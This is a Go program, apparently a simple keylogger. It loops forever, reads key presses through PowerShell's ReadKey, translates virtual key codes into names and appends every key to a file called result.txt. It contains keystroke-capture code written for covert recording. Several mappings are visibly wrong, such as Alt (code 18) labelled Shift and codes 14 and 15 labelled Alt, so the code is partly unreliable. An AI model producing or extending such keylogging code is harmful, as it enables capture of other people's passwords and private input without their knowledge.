package main

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
	"time"
)

func main() {

	file, err := os.Create("result.txt")
	if err != nil {
		fmt.Println("Error:", err)
		os.Exit(1)
	}
	defer file.Close()

	for {
		key := GetKeyPress()
		fmt.Printf("Key Pressed: %s\n", key)

		_, err := file.WriteString(fmt.Sprintf("Key Pressed: %s\n", key))
		if err != nil {
			fmt.Println("Error:", err)
		}

		time.Sleep(time.Second)
	}
}

func GetKeyPress() string {
	cmd := exec.Command("powershell.exe", "-c", "$Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown').VirtualKeyCode")

	output, err := cmd.Output()
	if err != nil {
		fmt.Println("Error:", err)
		os.Exit(1)
	}

	key := strings.TrimSpace(string(output))

	switch key {
	case "16":
		return "[Shift]"
	case "18":
		return "[Shift]"
	case "17":
		return "[Ctrl]"
	case "14":
		return "[Alt]"
	case "15":
		return "[Alt]"
	case "8":
		return "[Back]"
	case "9":
		return "[Tab]"
	case "13":
		return "[Enter]\r\n"
	case "20":
		return "[CapsLock]"
	case "27":
		return "[Esc]"
	case "32":
		return " "
	case "33":
		return "[PageUp]"
	case "34":
		return "[PageDown]"
	case "35":
		return "[End]"
	case "36":
		return "[Home]"
	case "37":
		return "[Left]"
	case "38":
		return "[Up]"
	case "39":
		return "[Right]"
	case "40":
		return "[Down]"
	case "41":
		return "[Select]"
	case "42":
		return "[Print]"
	case "43":
		return "[Execute]"
	case "44":
		return "[PrintScreen]"
	case "45":
		return "[Insert]"
	case "46":
		return "[Delete]"
	case "47":
		return "[Help]"
	case "91":
		return "[LeftWindows]"
	case "92":
		return "[RightWindows]"
	case "93":
		return "[Applications]"
	case "144":
		return "[NumLock]"
	case "145":
		return "[ScrollLock]"
	case "160":
		return "[LeftShift]"
	case "161":
		return "[RightShift]"
	case "162":
		return "[LeftCtrl]"
	case "163":
		return "[RightCtrl]"
	case "164":
		return "[LeftMenu]"
	case "165":
		return "[RightMenu]"
	case "186":
		return ";"
	case "187":
		return "="
	case "188":
		return ","
	case "189":
		return "-"
	case "190":
		return "."
	case "191":
		return "/"
	case "192":
		return "`"
	case "219":
		return "["
	case "220":
		return "\\"
	case "221":
		return "]"
	case "222":
		return "'"
	case "48":
		return "0"
	case "49":
		return "1"
	case "50":
		return "2"
	case "51":
		return "3"
	case "52":
		return "4"
	case "53":
		return "5"
	case "54":
		return "6"
	case "55":
		return "7"
	case "56":
		return "8"
	case "57":
		return "9"
	case "65":
		return "a"
	case "66":
		return "b"
	case "67":
		return "c"
	case "68":
		return "d"
	case "69":
		return "e"
	case "70":
		return "f"
	case "71":
		return "g"
	case "72":
		return "h"
	case "73":
		return "i"
	case "74":
		return "j"
	case "75":
		return "k"
	case "76":
		return "l"
	case "77":
		return "m"
	case "78":
		return "n"
	case "79":
		return "o"
	case "80":
		return "p"
	case "81":
		return "q"
	case "82":
		return "r"
	case "83":
		return "s"
	case "84":
		return "t"
	case "85":
		return "u"
	case "86":
		return "v"
	case "87":
		return "w"
	case "88":
		return "x"
	case "89":
		return "y"
	case "90":
		return "z"
	default:
		return key
	}
}
